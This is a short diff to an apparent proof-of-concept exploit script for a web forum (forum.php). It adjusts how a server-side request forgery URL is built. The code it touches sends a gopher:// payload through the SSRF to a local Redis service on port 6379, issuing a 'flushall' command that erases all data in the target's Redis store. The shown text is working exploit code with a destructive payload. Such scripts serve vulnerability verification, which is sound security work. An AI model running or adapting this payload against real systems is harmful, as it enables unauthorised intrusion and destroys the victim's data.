@@ -84,7 +84,7 @@ class TestPOC(POCBase):
 
                 
                 payload_flush = 'gopher://127.0.0.1:6379/_*1%250D%250A$8%250D%250Aflushall%250D%250Aquit'
-                recover_url = self.url + ssrf_url +payload_flush
+                recover_url = self.url + '/' +ssrf_url +payload_flush
                 req.get(recover_url)
                 req.get(self.url + '/forum.php')
 
@@ -133,7 +133,8 @@ class TestPOC(POCBase):
                 result['VerifyInfo'] = {}
                 result['VerifyInfo']['URL'] = verify_url
                 payload_flush = 'gopher://127.0.0.1:6379/_*1%250D%250A$8%250D%250Aflushall%250D%250Aquit'
-                recover_url = self.url + ssrf_url + payload_flush
+                recover_url = self.url + '/' +ssrf_url + payload_flush
+                
                 req.get(recover_url)
                 req.get(self.url + '/forum.php')
 
